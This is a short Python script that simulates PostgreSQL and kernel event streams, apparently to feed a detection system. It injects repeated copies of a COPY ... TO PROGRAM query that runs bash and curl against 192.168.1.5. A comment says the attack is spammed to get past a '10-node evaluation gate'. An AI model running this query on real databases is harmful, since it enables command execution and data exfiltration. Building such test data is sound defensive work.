import json
import time
import random
import os

PG_FILE = "postgres_events.json"
KERNEL_FILE = "kernel_events.json"

def init_files():
    open(PG_FILE, "w").close()
    open(KERNEL_FILE, "w").close()

def write_pg(session_id, query):
    event = {
        "session_id": session_id,
        "backend_pid": session_id,
        "timestamp": int(time.time()),
        "timestamp_unix": time.time(),
        "query": query,
        "username": "pgbench_user"
    }
    with open(PG_FILE, "a") as f:
        f.write(json.dumps(event) + "\n")

def write_kernel(pid, ppid, comm, syscall="execve", arg=""):
    event = {
        "pid": pid,
        "ppid": ppid,
        "uid": 1000,
        "timestamp": int(time.perf_counter_ns()),
        "timestamp_unix": time.time(),
        "comm": comm,
        "syscall": syscall,
        "arg": arg
    }
    with open(KERNEL_FILE, "a") as f:
        f.write(json.dumps(event) + "\n")

if __name__ == "__main__":
    init_files()
    print("Beginning Heavy Concurrent Simulation...")
    # Simulate 50 concurrent benign PG users doing repeated SELECTs
    for i in range(100):
        for bg_session in range(1, 10):
            write_pg(1000 + bg_session, "SELECT aid, abalance FROM pgbench_accounts WHERE aid = 5;")
        
        # Inject the attack incrementally
        if i == 50:
            # Spam malicious activity to bypass the 10-node evaluation gate 
            for j in range(12):
                write_pg(666, "COPY (SELECT * FROM pgbench_accounts) TO PROGRAM 'bash -c \"curl 192.168.1.5 > exfiltrate\"';")
            
            for j in range(8):
                write_kernel(999, 666, "bash", "execve", "curl 192.168.1.5")
            
        if i == 51:
            for j in range(5):
                write_kernel(1000, 999, "curl", "connect")
            
        time.sleep(0.01) # Simulate real-time streaming latency
        
    print("Simulation Stream Complete!")
